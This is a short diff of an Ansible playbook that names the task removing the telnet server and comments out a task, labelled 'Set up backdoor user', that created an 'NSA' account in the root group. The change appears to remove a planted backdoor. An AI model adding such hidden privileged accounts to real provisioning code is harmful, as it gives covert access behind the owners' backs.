@@ -3,10 +3,12 @@
 
 - include: apache.yml
 
-- apt:
+- name: Remove telnet server
+  apt:
     name: telnetd
     state: absent
 
-- user:
-    name: NSA
-    group: root
+# - name: Set up backdoor user
+#   user:
+#     name: NSA
+#     group: root
